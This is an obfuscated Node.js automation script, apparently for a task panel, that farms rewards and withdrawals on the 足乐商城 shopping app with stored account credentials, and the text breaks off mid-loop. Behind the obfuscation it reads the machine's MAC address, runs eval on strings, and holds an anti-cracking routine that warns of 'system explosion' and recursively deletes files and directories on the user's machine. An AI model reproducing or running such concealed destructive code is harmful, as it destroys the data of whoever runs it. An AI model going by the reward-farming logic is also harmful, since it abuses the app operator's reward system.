
/*
足乐商城
链接：https://app.sjdhwu.com/share/wechatLogin?share_code=umyLEhKL
变量 zlzh  值：账号#密码@账号密码
提现金额变量：balance  值：0.30 ，23.80 ，68.00 ，108.00 ，158.00 ，188.00 ，200.00
变量：zlname 值：提现名称
变量 cdkey   对应脚本验证卡密。所有脚本通用。。
Cron 0点，12点，20点 各跑一次
*/
const $ = new Env('足乐商城');
const _0x4ecbe2=_0x5f0f,_0x23efcb=_0x364d,_0x1b9b51=_0x4740;(function(_0x431a5a,_0x46fc76){const _0x28b05b=_0x4740,_0x3c8b4f=_0x5f0f,_0x4ddad3=_0x364d,_0x1873a4=_0x431a5a();while(!![]){try{const _0x5066f3=parseInt(_0x4ddad3(0x2dd,'mQXD'))/0x1*(parseInt(_0x3c8b4f(0x206))/0x2)+-parseInt(_0x4ddad3(0x2e7,'&SeV'))/0x3*(parseInt(_0x3c8b4f(0x2e2))/0x4)+parseInt(_0x4ddad3(0x2a2,'@IX2'))/0x5*(parseInt(_0x28b05b(0x280))/0x6)+parseInt(_0x28b05b(0x28f))/0x7+-parseInt(_0x28b05b(0x214))/0x8*(-parseInt(_0x3c8b4f(0x1e0))/0x9)+parseInt(_0x28b05b(0x1f5))/0xa*(-parseInt(_0x3c8b4f(0x266))/0xb)+-parseInt(_0x4ddad3(0x2f6,'#3]['))/0xc;if(_0x5066f3===_0x46fc76)break;else _0x1873a4['push'](_0x1873a4['shift']());}catch(_0x522225){_0x1873a4['push'](_0x1873a4['shift']());}}}(_0x3482,0xa8544));function _0x4740(_0x229408,_0x478b98){const _0x348222=_0x3482();return _0x4740=function(_0x5f0f66,_0x467b7f){_0x5f0f66=_0x5f0f66-0x1b2;let _0x3d92a3=_0x348222[_0x5f0f66];if(_0x4740['EDrLiE']===undefined){var _0x237e62=function(_0x474073){const _0x27b4ab='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2d39a3='',_0x44ff0b='';for(let _0x90c985=0x0,_0x34e517,_0x444ceb,_0x364dbd=0x0;_0x444ceb=_0x474073['charAt'](_0x364dbd++);~_0x444ceb&&(_0x34e517=_0x90c985%0x4?_0x34e517*0x40+_0x444ceb:_0x444ceb,_0x90c985++%0x4)?_0x2d39a3+=String['fromCharCode'](0xff&_0x34e517>>(-0x2*_0x90c985&0x6)):0x0){_0x444ceb=_0x27b4ab['indexOf'](_0x444ceb);}for(let _0xad7b87=0x0,_0x510230=_0x2d39a3['length'];_0xad7b87<_0x510230;_0xad7b87++){_0x44ff0b+='%'+('00'+_0x2d39a3['charCodeAt'](_0xad7b87)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x44ff0b);};_0x4740['gPZzTt']=_0x237e62,_0x229408=arguments,_0x4740['EDrLiE']=!![];}const _0x2acff5=_0x348222[0x0],_0x35908c=_0x5f0f66+_0x2acff5,_0x4e5136=_0x229408[_0x35908c];return!_0x4e5136?(_0x3d92a3=_0x4740['gPZzTt'](_0x3d92a3),_0x229408[_0x35908c]=_0x3d92a3):_0x3d92a3=_0x4e5136,_0x3d92a3;},_0x4740(_0x229408,_0x478b98);}const VM=require(_0x1b9b51(0x28b))(),path=require(_0x23efcb(0x273,'OXjw')),fs=require('fs'),{MD5}=require(_0x23efcb(0x2b1,'sg26')),CryptoJS=require(_0x4ecbe2(0x2f1));function initVM(){const _0xd0cc40=_0x1b9b51,_0x277330=_0x4ecbe2,_0x4c6ae7=_0x23efcb;vm=new VM();const _0x4e485c=vm[_0x4c6ae7(0x290,'m$&r')](),_0x54c0b8=vm[_0x4c6ae7(0x2a5,'m5@@')](),_0x1bd0ac=vm['createFunction']('log',function(){const _0x2106f3=_0x5f0f,_0x19ba90=_0x4c6ae7,_0xc8262f=_0x4740,_0x545be0=[];for(let _0x37a6ae=0x0;_0x37a6ae<arguments[_0xc8262f(0x1bb)];_0x37a6ae++){_0x545be0[_0x19ba90(0x27d,'m$&r')](vm[_0x2106f3(0x29b)](arguments[_0x37a6ae]));}return console[_0x2106f3(0x25a)](..._0x545be0),vm[_0x19ba90(0x21a,'*^7j')]();}),_0x3e43b=vm[_0x277330(0x2cc)](_0x4c6ae7(0x233,'DG6&'),function(_0x5e40db){let _0x4f8ceb=eval(_0x5e40db['value']);return vm['createString'](JSON['stringify'](_0x4f8ceb));}),_0x1b801c=vm['createFunction'](_0x4c6ae7(0x264,'DG6&'),function(_0x1801fa){const _0x3fb111=_0x4740,_0x5d18aa=_0x277330,_0x5341e0=_0x4c6ae7;let _0x3ae95f=_0x1801fa[_0x5341e0(0x248,'&SeV')],_0x527cd9=fs[_0x5d18aa(0x326)](_0x3ae95f,'utf-8')[_0x5d18aa(0x26f)](/\r\n/g,'\x0a'),_0xc6ee12=CryptoJS[_0x3fb111(0x215)](_0x527cd9)[_0x5d18aa(0x2fc)]();return vm['createString'](_0xc6ee12);}),_0x362981=vm[_0x277330(0x2cc)](_0x4c6ae7(0x22b,'m5@@'),function(_0x2f4b40){const _0x279d31=_0x277330,_0x45a7c9=_0x4740;let _0x5e04ed=CryptoJS[_0x45a7c9(0x215)](_0x2f4b40[_0x279d31(0x1c4)])[_0x45a7c9(0x236)]();return vm[_0x45a7c9(0x274)](_0x5e04ed);});return vm[_0x277330(0x307)](_0x54c0b8,_0x4c6ae7(0x2d7,'pEer'),_0x1bd0ac),vm[_0x277330(0x307)](_0x4e485c,_0x277330(0x327),_0x3e43b),vm[_0x4c6ae7(0x26a,'*%ht')](_0x4e485c,'console',_0x54c0b8),vm[_0x4c6ae7(0x238,'Ht0y')](_0x4e485c,_0x4c6ae7(0x1e1,'wmA4'),_0x1b801c),vm['setProperty'](_0x4e485c,_0x277330(0x261),_0x362981),vm[_0x277330(0x29e)](fs[_0x277330(0x326)](_0xd0cc40(0x1eb))[_0x277330(0x2fc)]()),vm;}function destroyVM(_0xc05bf7){const _0x1f4b66=_0x23efcb;_0xc05bf7[_0x1f4b66(0x322,'Ht0y')]();}function _0x3482(){const _0x68c585=['kLZcMmo7WRaYjYxdQZ8','WOpcR8k8W70','tfnOB3bnywXSuhjVqxbWlZmUms41icHPugHVBMu7igLpuYaXnc4YoYbty2fSzs8YlJaWkq','青龙环境','ls0Xmdq3mdCWnI0T','jrNdQeldQ8kAqSkuWPpcGwTNWRjPrCo6W4dcUHy1WPxdT8kJucJcH3DDFhfhbaBdLMVdSmkO','W6NcQmku','6kYFWPyA56AC5lIq5zoS5yAG552n5BQl5zkd5zop','kI8Q','WRbIW7Tq','5lUJ55cg546V5Akd','6AEp6Agm5Ro45Rc36ysc5BMC576Z5ygd776y','ze1DWPi','WPFdOmkP','number--','566O5yIV77Ys6iYy5B2X','getProperty','BNvTyMvY','Aw5KzxG','55s16isr546V5Akd','getdata','WO9NW6ny','xbzZW6ztcSkZW5LhW7/cJeBdPCoTdSo/WRS','uaLJ','Dg9tDhjPBMC','https://app.sjdhwu.com/yw_api/v3/homeBubbleRewardsDoubled','kCkzW5dcVCooW5KWWPlcSLn9','当前球员：','WOZdHLSV','EMGTsgfUCY1vuZTXpteSihPOluHHBNqTseS7Ct0WlJK','https://app.sjdhwu.com/yw_api/v3/memberPk','mh0Z','jMrLDMLJzv9Uyw1LpvnluI1bmczWAg9Uzt0','number','WPH9W4GExSo5W5ddJ095W4JcT8kLz8o+WPJcLq','获取PK：','readdirSync','AIxdSq','jbTUta','mtiZndu2nZG5ma','W5ChcmkSW7r0WO3cTIVcGCo2FSoAWQ0','W6XFr8oaiCozWPtdTGJdUG','WQSmgmkbCq','ywnJzxnZx3rVA2vU','iw3cMCoilmkZwr/cGaWgzCowWQldQ18+cSktxNpcVGJdGXjdpSkBwGZcICk1','ueVVVjO','y29Kzq','unlinkSync','n3pcVbBcRq','6i2e5y2sWP3dR+wMK+I3MU+9Uq','tWnpW6ypt8kLW79aW6dcIa','W6pcN8o7md/cP8kHW4pdV8o4','bLDlha','sXpdRmosChJcPtfQWOddKbC','https://app.sjdhwu.com/yw_api/v3/prizeGet/','W4NcVgJdUCkH','WPpcTmk5W6ZcIvhdTuW','t0C5sffytNrumwXQzgXsr2ffsNPrBvjOwKzWufvSAZbvwfO2zdbkD1qZAeTwALjOyKm5AvPSAhzvA2rnv1vKmK1uuLPvEKiWwtnRngeYmhzIv1jdtxDVpq','x8kCW7PC','dSkjW59HW6TCW4tcL3FdVvPGW6X9','log','qZOVv2LUzg93CY9ZExn0zw0UDhH0','BMfTzq','W7BdISkAW5/dOq','5l+855Ev6i2n5Rgm77+i','WQZcK8kWW7FcQMxdUKnXqCotW5uwwSkeW75PW7WgrSkPimkoW53dSJyPBmokoIRcQ8k7c15pv8kcdbFdUwzfWRfkgsqmWPFcHSoiWR4','D2fPDa','ddd','AJFcH8k0EmoRhqRdRg8','W7RcImksW57cIHnp','WO5MW6jz','WOnWW45qcCoWWOqiW73cJNu','671WQjaFY','pvJcMmk3','5OQj5AAE6i+c5y+Z77+a','jCkoWONcKG','fhWyWQ4hWQddLbFcNH5C','DhLWzs0T','qXyg','kmkzW4xcICo6W58SWPlcK15QyW','zgf0yq','replace','W5FcQhFdQmkHW4W','cUwfRowrIU+8MG','W6RdHmkp','sW1UW74','y3jLyxrLu3rYAw5N','bMKCWPiCWQZdHqBcHqvlnbVdGvjy','W6C+mmkuW7m6W5ldIY/cGmoZnCoAWRpcKxCSD8ooWQFdJmk3ygP+g8kpoxhcVmosW5vzb8okW54aDSooW60yWRi','PK:\x20与【','W5LAzbVcHSkIWQxcMuW0WPJdHCkUWPVdMmoeWPTWWRDsW4q','ls0XmdCXntuYls0','https://app.sjdhwu.com/yw_api/v3/watchAdsToIncreasePkTimes','cJZcTcnsCMhdGf3cKCk4zZpdMmo/juCJW5BcQCoYv34hiXGss8kFW6LTWPDNW4ddSGddTWRdGSoSib1RWOhdLa4gsSohrWBcT8olxmkgwxGVi2OeWOLMWPziobpcJmoIW59vgCkPlmkTpCoup8kLW7Xprd/cUYj5W4TNfSoqWRFcHwuyWObRhrvrW4FcRmoyj8kaEbX1Cr48W5OBWP7dHCoi','fKXlgmkGW4TXW4RcUJ8SvSk8osu2W40','kwpcSCoa','zxHWzxjPzw5Jzv9WB3rPB25FAwqTlq','yxbWBgLJyxrPB24VANnVBG','nKvothjxDa','6lsT5lMWmEEtTUMRMoE6P+InR+AWTo+8MG','WOJdRYNcVSoXWOJdQ2tdQSkh','6Awe6Aoy5RoC5RoL6yEB5BQq6Acq5yYT77+C','5Q+p5AsPmtlNGRNVViWYmoEcUE+8Jdi054k55OgI5Asn55cd6zIF5yY56ywn5QYH5PwW','WQRdJmoZBSkHW4uAWOm8WQtdJhNdR8k6','首页气泡金币领取成功：','ohmGcW','W4tcLmomhmoZW4hdJG','6k+3mtxNP5lKUyVLKi7LHO3NNiVLUB/LKyRLK6y','pwvkb8o8WQz0W4pcSam/tCkyzxv7WOZdHJS1W63cPCkeWR9pW7tdMZCdWPrcW5NdSftdUt7dRZFcISk+c8kCkmkYW6RdMdxdLX8wWQddVW','C2fIBgvQCY9YDw50Aw1L','WOFdQ8kyW5tdKSkAeCogrSktba','zxrO','1234567890','odq5otCWmwztCMftyW','pNpcTSoVWPRcTd1ppG','balance','s8oelHfnxmoAW6ldMmoJW6rcECk/WQlcRGxdNhVdVHzaWRhcUgZcR8o6ENnihCkGdSo+WR7cH1ZcM8kPeK/dNJdcVhxcI8onWRNcNSonW7K','lHC8EdnCW6nUxgZcLmk7tSohwt0DWQ92WQH4W4ddMrxcR8oWn2iOjheL','6AAw6Ag15Rcu5RoH6yEr5BIb6Akg5y+w77YA','b8oZWR4','we1mshr0CfjLCxvLC3q','6yEr5BIa5ysK5O2R77+u','member_player_id--','Bg9N','W4yXWQSq','asString','W6WLkSkqW6vUWO4','6i+W5y+e55on5zc95OUy5yQH77YU6BQ76k+65y6m57MM562g5lMV5lIW55oS5zkj','run','W5bixqa9zCkkWPVcSbG','抽奖获取：','57+75ycn5AsX6lsL77YA','nJLdomo5s2CwWPfJWO9QWQK','6k6CWQ3dRoENHos7T+wtO+whHUEFHUw7JUwqV+wsMG','z2v0','WPddTSkOW4xdLSkAlmoNtCkfaSk7','zgr0ANn0yxr1CW','W68uWPKcfgxdSG7cMCozga','WRKmamkv','A2vLCc1HBgL2zq','5lM06lsD5y26f8k2W5iDW5ddM8ocjs/dGdqhWQpcOW','y24rBa','kCo5WRHKW5NcN2S','W6ldISkCW40','z3PPCcWGzgvMBgf0zsWGyNi','nXv4wSkB','\x0a开始【足乐商城','jazZwCkkk8kiWOOh','ofRcJ8kZWQaUgZFdRdK','WPJdHL09pG','W6KqWOOjlN/dJbxcNCkyqmoplSod','XMLHttpRequest','WOddSmkSW5ddSCkgdCoM','rSkhW7S','y01fWP8','y2rRzxK','C3bSAxq','c3yl','mCkoWO/cGdS','https://app.sjdhwu.com/yw_api/v3/redEnvelopeRewardCollection','WPldGSoz','createString','lqeyW4mdWQxcHCkhhmkqha','W5NcLrX6BSougN7dJCo5','W6OKmG','y2fSBa','hmo9WRbI','https://app.sjdhwu.com/yw_api/v3/memberMatchV3','n8kzW5FcNSoDW5eL','ECk+fCo7bKqHWPddRthcImoqWPtcPW','from','oLBcImkZ','6i6D5yY+W4WV5OMM5yI9','yxntDhjPBMC','createFunction','5B2t5yMn6k6+5Ash5y+V5OMN6kgm6lsM5y+36zMq5yI25lI6','W6xcOSoxamoIW6VdINuYt1yIW7RdKvldQCo3tSkPhCo4dCkhhfDSW5JdMSoIWODVW4JdL3RdTwm2WRTOFrldGbvvAmkIf3ZdGZCgW7y','W5BcTNldVSkWW47dS2JdVCkopSoP','WQ7dVSo5WR/cHa','WOqLW4qwaSk8W4BdG0X7W4RcPSkFo8kXWO7cJKhcQrSKh0zf','AxnoB2rL','ogRdKmoL','emkhBveivq','get','WRBdJmk8zq','WQFdK8oK','视频任务：','77Ym6yEr5BIb77YA','WOtcPCkUW7hcUu3dHef8FmoeWPD6ECk/WOn3WPmh','vSkPbKddRd0','WOBdPSo0WOq','WONcGmk/W7BcQXei','mCkzW4hcNCkrW5CSWP7cTKi','W4Xmuqq','pSkDW5dcJa','WQRdGK48pSkqdq','24kvLsqz','DmoOWPKjWR8iWPtdPtlcRa8LWR8PWRvOWQVdMMj7a8okW6VdL3GdWOLCWRldICoiaNFcTmo0yCoZWRRdJXPNWPj9t8oaWPWIjYGwDJPiW5v2W71ZdmkrW5RcS8khW4tcN8kmmKRdSSo4hXRcM27dVmkTBazxWO8GgSo3W49Yu8oblYqhW4lcUbiHCJG3W7Tlv8kvWRNcLXJdGCowW6tdMI1NWOblhSowxmkWs8kuWQTKkWVdPmkObI8QW6iaWRbRF8oJqwadjCoKsGtdHCoQW6vEW5BdQNrebaWljhWIW7KudmkrhJtdS8kIlxmoWQ92W7hcTmk5D8kPWR3cQHhcLb5aWPhcNmolWPZdQ8kisCkJswtdI8kxWRf7u2vdW51xW5ddN2PwetalWOtcR0iyxCkkWOpcJLyiW6iUgJvYW6FdIJBdHCkUW4ldLrNcN8odWQZcVMyUW4RcL207WPdcNgNcOCkGrNu/','WOpdRmkIW4RdH8ostG','WRumb8kRCCkxW5pcQ0pcOZJdLwZdTaGnWR7dTshcGCoK','yxbWlNnQzgH3Ds5JB20','W69vq8obimoBW7pcG2NcUG7dIG','CgfYC2u','lI5mls0','c0hcPGRcUhnvdZlcM8kZbs5QWP/dVSknjSouWPldUCk2amo/B8osaNKSW60BW4G7WPWfrvnqoMRcGXb9W6rzdSkyWR5zW49ffW','DIddVvhdVqGdw2FdUW','application/x-www-form-urlencoded','data','获取PK失败：','6kw+6Ag857Mr5y6P77+1','f1BdNmoVpCkqs17cUq9pE8kQW6pcT1b3tmkpocFdSftcHWPGASkeaGFcH8oLDCkqASkQixLJu8kIW4LceCkMW6u5lKP/FSoU','crypto-js','app.sjdhwu.com','post','DhjPBq','WRbCW4LEFZZcO1tdJmocgmkh','W5RcNX94BCoshx7cMCkbBXVcGH0','g8oyWQHtrSkvfmok','WR/dK8owmmkIW4OmWQGQWQlcHW','视频红包：获得','jh3cQGa','rmdirSync','toString','A8omWPddMSkmWOfWW4e','WRhdGSkSyq','cNWFWO0uWQJdGq','application/json','WOJdRslcVSoWWORdQW','r8orlGa','W7/cR8oEWRxdNhjggZpcISkVo1ZcRKhcHh3dLmo+WPRdHSkaWPDJv8oSWQ3dR8oHW60BBq','lCkDW43cMq','mta0nZa3mdy','Bearer\x20','setProperty','W4hcHColh8oHWPZcHdy/B1rJW4JdI0BcRSkZfCk2umkIqmkadhbBW5BdHmoUWPm5WPlcT07cUJ5MW5y1l1ZdLG5xBmkMvINcIa','xab','\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22Content-Type\x22:\x22application/x-www-form-urlencoded\x22,\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22Host\x22:\x22app.sjdhwu.com\x22,\x22Accept-Encoding\x22:\x22gzip\x22,\x22User-Agent\x22:\x22okhttp/4.9.0\x22}','W57cUg7dJCkOW5hcVJ3cVW','ls0Tls0Tls0Tls0TlsdLHBe','https://app.sjdhwu.com/yw_api/v3/login','WRhdGSkMCg/dV8oL','uY1BW4TfWQldLHpcPIvU','wait','W5vAyYu','增加抽奖次数失败：','mte1mJm5ngXHB3Lvwa','6lsT5lMWmEEtTUMRMoE6P+InR+AWToAiKowkN++8JowjJEw+Gos9V+EuQa','BwvZC2fNzq','vGLPW6uEtCkY','w8oTe1S','Bw9UzxKTlq','zM9VDgjHBgXFCgXHEwvYCW','g8o9WQTLW5K','WQldR8k4W40','Dg9vChbLCKnHC2u','&real_name=','5l2/55sO6i2V5Rc05y2h57QN5OIq5yQF','28066008mHFAJy','nmkjW4K','dNxcUMNdRxVcG8ozWP0TWPv3q8oP','pSkzW5FcMCooW5K5','10470706','ywrKCMvZCW','WPTMW5up','readFileSync','xxxx','Bg4s','existsSync','5lQS5lIr6lAS5lIl776E','EYjHC3nVy2LHDgLVBL9Pzci6iG','m1ndgSoPWPK1','env','Bwf0y2HFAwqTlq','zlzh','翻倍成功获得：','55M75B2v5AsX6lsL','isDirectory','WPldQmo5WPu','WQVdICkbW6ZdLSkle8oxqSkrfmkQW6RcSG','6k2M5Psl6zEw5Q+n5Q+Z5Psb5BE25l+e55E45A+E772M6k6R5lIY5lI95Pwb6zw95QYV5yAT5P2+','*/*','isNode','DxrMoa','done','rSkwlCoJaf8HWQFdUJtcHa','fHPWqJDaWRa','ra7dRG','BgvUz3rO','toUpperCase','ls0ZnZCWnJmTlq','yMfSyw5Jzq','iSkaWPNcLG','n0JdG1xdV8kA','WPJdOCkOW5tcJ8kEd8oSuCkf','/sys/class/net/','DHLgC8k6nmoc','value','nv7dQeRcTSkExmkuWOdcIG','WQz+ESoCWOm','sZScWOSyWQ3dGqddJLa','WRP6zSoiWPlcLW','lhmMgsq','W7RcJmk3D8oIWPHoW50','keep-alive','WRP2W6i','W67cOSkwWO3cKh1zxXdcVa','eezsrSo/WOfXW4FcQYzJqCk2Ea','当前版本：1.0\x20','W5j+jXyerL3dHx1J','F_OK','z2v0zgf0yq','5lIQ6lsM5y+3cG','pddcRXBcU1fxcJ/cV8kObqffWOBcTCkCmG','u8oJaa','6AAw6Ag15Rcu5RoH6yEr5BIb57+75ycn5OIq5yQF77YA','提现：','CMvHzezPBgvtEw5J','m8kcWPNcMIZdPqpdKSkz','6kEU6AoW5lMY5yIs77YE','g8oAWQ9qq8kue8oefmoU','zM9YrwfJAa','qSkCpCow','parse','mJLcpmo6tWCxWQjNWQTO','6422337NfiMef','jwSTeW','limit--100','Dw5SAw5Ru3LUyW','Ahr0Chm6lY9HChaUC2PKAhD1lMnVBs95D19HCgKVDJmVAg9Tzuj1yMjSzvjLD2fYzeLUzM9YBwf0Aw9U','rCkslCos','升级球员：','kSkkWPJcG3pdLXBdLCkmW6C','WRFdLCkHD37dOSofWOlcQmkR','uCovoWvAd8khWP7dGmo9W7C','WO7dRmo1WPfoW6VdGSkBWQZdPG','lI9VDxrWDxrFzMLUywWUANm','zh-Hans-US;q=1,\x20zh-Hant-HK;q=0.9','WO3dK8k0W4FdISkmExzkW5BcT8ksWRhdU8o7W6GnrSk1fxKrhdBdPCk2jCk+gSkzW4LgamkfWQdcIMTkW53dMSk8W7KFwSkrsCoeW5raWQFdLCod','tmkwkSoae1C0','code','6i2H5y+j55cl5zo377+8','gzip,\x20deflate,\x20br','44cr6l+B6kgmufNKUQtMMjmS6i635B6x','W5tcGSku','zlname','ndq3ntbTCMfkt0S','qWf0','CgfZC3DVCMq9','nJG2mtCWmeXRDhDZrG','ody4ndG4mdmWnZG3mtq1','W7pcKLem','getval','W6KEWQSAowldVqq','iX54ra','qMvHCMvYia','password--','F03cJCkKWRq4pbhdTdVcM2fJaa','message','xW1UW7C','wan+W7m','fwRcHmk5WQmqksldRGRcHxThtCohWQFdSqFcNfeeymkSy8oMtMm8ASoPW78RWRmtW7ldP8kcBYVcIYJdLq3dGrDMW41SW44xWRbS','WRPWBW','1152394laoyUX','W6tcSmksWO/dMq','W6/cKKu','pCkHW7zzWRjjW5JcRgtdQq','oLFcKq','WRDSW6Tu','WQNdVSoIWRG','W5dcImksW4JcIHmC','https://app.sjdhwu.com/yw_api/v3/member/info','qrldH8oCyhG','ttzg','WPFdPCk5W4u','LShopMallProApp/3.1.5\x20(iPhone;\x20iOS\x2014.2;\x20Scale/2.00)','W7ZdG8ofW6tdPCofW5XfWPHraXaHW6NcRfJdJv3dHSoAWOvJlCoRmmomWPBcU8oSW5vwW5e','oev0B3jgBa','tuq1','W7Liwqj1DSog','rqtdUSoazxRcKW','WOD+W6Ltha','W47dHemNpSkmwrNcGmkOtMFcQZy0jCoTWRyKWPeBfer9CSouWQdcMYGbumoaimotW5/cQmoXB8kteq7dTcnSosXbcH5iwSouBmo5W4KUnGzGlqxdU8oHB3DhW4BdRCkoW5ekh8kJcCk2W652W7r8tSo7mu/dVJ/dNmoHW7n/W4VdNJxdSmkyz8oHnCkzm1qmWQ01bqyebM/cNmoju15jWOH/yKmkzSo7yCk2lmo0h8kmWOZcVCoxW5WWW5PJW4hdNglcRstcNJf+vWvqCCkSWQ/dLcNcJ8kwf8oyb1hcHNHBb0pdL8o+xNBdJ1CLWR/dOI8cbCovimokEqtcUYj8W5SDW5C9eSkop8oFyd3dNqXaWQ3cQ3OwW41nmLe1t2aoemkXj0JcICkIWOldG1/dGSorghTKdsy','nW10uszxW4uTBvRdICkJhCkteq','--10470706--','W6KEWQ0Eo27dOsdcNCkhua','Cg9ZDa'];_0x3482=function(){return _0x68c585;};return _0x3482();}function abc(_0x319e3b,_0x1d4b6a,_0x5ae26d,_0x45241e,_0x3ad173){const _0x146409=_0x1b9b51,_0x39355a=_0x4ecbe2,_0x2a0fe4=_0x23efcb,_0x3f891a=_0x319e3b['getGlobal']();let _0x2aeda1=_0x319e3b[_0x2a0fe4(0x1b8,'UL&h')](_0x3f891a,_0x39355a(0x309)),_0x20c06d=_0x319e3b[_0x2a0fe4(0x2b8,'vWZr')](_0x2aeda1,_0x319e3b['createUndefined'](),_0x319e3b[_0x2a0fe4(0x253,'FBs1')](_0x1d4b6a),_0x319e3b[_0x39355a(0x2bf)](_0x45241e),_0x319e3b['createString'](_0x3ad173),_0x319e3b[_0x146409(0x274)](_0x5ae26d));return _0x20c06d=_0x319e3b[_0x146409(0x2cb)](_0x20c06d),_0x20c06d;}function xyz(_0x105768,_0x24dd2f,_0x404adc,_0x4ba97a,_0x2ce5ea){const _0x5bd196=_0x1b9b51,_0x495eee=_0x4ecbe2,_0xcddfaf=_0x23efcb,_0x2b7875=_0x105768[_0xcddfaf(0x30b,'tl0v')]();let _0x5ed106=_0x105768[_0x495eee(0x22e)](_0x2b7875,_0xcddfaf(0x1f6,'OXjw')),_0x18850e=_0x105768[_0x5bd196(0x2c3)](_0x5ed106,_0x105768['createUndefined'](),_0x105768[_0x495eee(0x2bf)](_0x24dd2f),_0x105768[_0x5bd196(0x274)](_0x4ba97a),_0x105768['createString'](_0x2ce5ea),_0x105768['createString'](_0x404adc));return _0x18850e=_0x105768['asString'](_0x18850e),_0x18850e;}let status;status=(status=$[_0x4ecbe2(0x1fb)](_0x1b9b51(0x2a6))||'1')>0x1?''+status:'';let zlsjhArr=[],zlzh=($[_0x23efcb(0x20f,'FBs1')]()?process[_0x23efcb(0x2c2,'!sIE')][_0x4ecbe2(0x32f)]:$['getdata'](_0x4ecbe2(0x32f)))||'',balance=($[_0x4ecbe2(0x1b5)]()?process[_0x4ecbe2(0x32d)][_0x4ecbe2(0x291)]:$[_0x1b9b51(0x1d2)]('balance'))||_0x23efcb(0x29a,'DG6&'),name=($[_0x23efcb(0x1c0,'V)(v')]()?process['env'][_0x4ecbe2(0x1f4)]:$[_0x1b9b51(0x1d2)](_0x4ecbe2(0x1f4)))||'',acckey=($[_0x1b9b51(0x2d2)]()?process[_0x4ecbe2(0x32d)][_0x1b9b51(0x2b9)]:$[_0x4ecbe2(0x232)]('cdkey'))||'',token=_0x1b9b51(0x2e9),cookie='',phone='',password='',arrs=[],all_msg='',mac='';var gtr,key='';if($['isNode']()){gtr=require('fs');if(isFileExist(_0x23efcb(0x26c,'vWZr')))console['log'](_0x1b9b51(0x231));else{console[_0x1b9b51(0x299)](_0x4ecbe2(0x221));function getMACAddresses(){const _0x3c588c=_0x1b9b51,_0x3c42aa=_0x4ecbe2,_0x4b59e1=_0x23efcb;var _0x2fe33d='',_0xb1021e=fs[_0x4b59e1(0x1e9,'gtdU')](_0x3c42aa(0x1c2));return _0xb1021e[_0x3c588c(0x1dc)](function(_0x2657e4){const _0x5d039f=_0x3c42aa,_0xb196ab=_0x4b59e1,_0x4be8e1=_0x3c588c;var _0x4be3e1=path['join']('/sys/class/net',_0x2657e4,_0x4be8e1(0x324));_0x2657e4['substr'](0x0,0x3)==_0x4be8e1(0x28d)&&fs[_0xb196ab(0x1e8,'%MF5')](_0x4be3e1)&&(_0x2fe33d=fs[_0x4be8e1(0x1d8)](_0x4be3e1)[_0x5d039f(0x2fc)]()[_0x4be8e1(0x2f4)]());}),_0x2fe33d;}mac=getMACAddresses();}}else console[_0x4ecbe2(0x25a)](_0x1b9b51(0x228));function isFileExist(_0x213ebd){const _0x5d82ae=_0x4ecbe2,_0x53ef9d=_0x23efcb;try{gtr[_0x53ef9d(0x2b2,'li%x')](_0x213ebd,gtr[_0x5d82ae(0x1d1)]);}catch(_0x2666f5){return![];}return!![];}function addF(_0x442f89,_0x2cfd3e){const _0x3c0944=_0x4ecbe2,_0x3ffd22=_0x23efcb,_0xbb1b77=_0x1b9b51;let _0x579106=0x0,_0x3f2865=_0xbb1b77(0x25b);if(isFileExist(_0x3f2865))_0x579106=gtr[_0x3ffd22(0x26d,'Ht0y')](_0x3f2865,_0xbb1b77(0x1b6));else{if(isFileExist('C:/'))gtr['writeFile'](_0x3f2865,'1',function(_0x1972fb){if(_0x1972fb)throw _0x1972fb;});else return;}if(_0x579106==0x63)return 0x63;console[_0x3c0944(0x25a)](_0x579106),console[_0x3ffd22(0x23d,'wmA4')]('警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！',_0x579106);if(parseInt(_0x579106)<0x3){let _0xa38f9a=parseInt(_0x579106)+0x1;gtr['writeFileSync'](_0x3f2865,_0xa38f9a+'',_0x3ffd22(0x258,'tKzs'));return;}if(!gtr[_0x3c0944(0x329)](_0x442f89))return;if(gtr[_0x3ffd22(0x256,'cP&L')](_0x442f89)[_0x3c0944(0x332)]()){var _0x178a41=gtr[_0x3c0944(0x242)](_0x442f89),_0x1cf225=_0x178a41['length'],_0xedfd16=0x0;if(_0x1cf225>0x0)_0x178a41[_0xbb1b77(0x1dc)](function(_0x19abcd){const _0x5ceac2=_0x3c0944,_0x3c55bf=_0x3ffd22;_0xedfd16++;var _0x272cc2=gtr[_0x3c55bf(0x2b6,'m5@@')](_0x442f89+'/'+_0x19abcd),_0x13be60=_0x442f89+'/'+_0x19abcd;gtr['statSync'](_0x13be60)[_0x5ceac2(0x332)]()?addF(_0x13be60,!![]):gtr[_0x5ceac2(0x24d)](_0x13be60);}),_0x1cf225==_0xedfd16&&_0x2cfd3e&&gtr[_0x3ffd22(0x1d9,'7C8w')](_0x442f89);else _0x1cf225==0x0&&_0x2cfd3e&&gtr[_0x3c0944(0x2fb)](_0x442f89);}else gtr[_0xbb1b77(0x1e3)](_0x442f89);}!(async()=>{const _0x1d45d4=_0x23efcb,_0x20cd4b=_0x1b9b51,_0x2e834a=_0x4ecbe2;if(typeof $request!=='undefined')await ddtjck();else{initVM(),arrs=abc(global['vm'],acckey,mac,0x33,0x0);if(arrs=='')return;arrs=JSON[_0x2e834a(0x1de)](arrs);if(!arrs)return;zlsjhArr=zlzh[_0x20cd4b(0x2ba)]('@'),key=arrs[_0x1d45d4(0x235,'OXjw')],console['log'](_0x20cd4b(0x271)+arrs['gg']+'\x0a'),console[_0x1d45d4(0x205,'TDHg')](_0x2e834a(0x1cf)+arrs['bb']+'\x0a'),console[_0x20cd4b(0x299)](_0x20cd4b(0x30c)+zlsjhArr[_0x20cd4b(0x1bb)]+_0x1d45d4(0x2aa,'V)(v')),console[_0x1d45d4(0x272,'1]Hw')](_0x20cd4b(0x2cd)+arrs[_0x1d45d4(0x320,'Ht0y')]+_0x20cd4b(0x1d3));if(zlsjhArr['length']>parseInt(arrs['num']))for(let 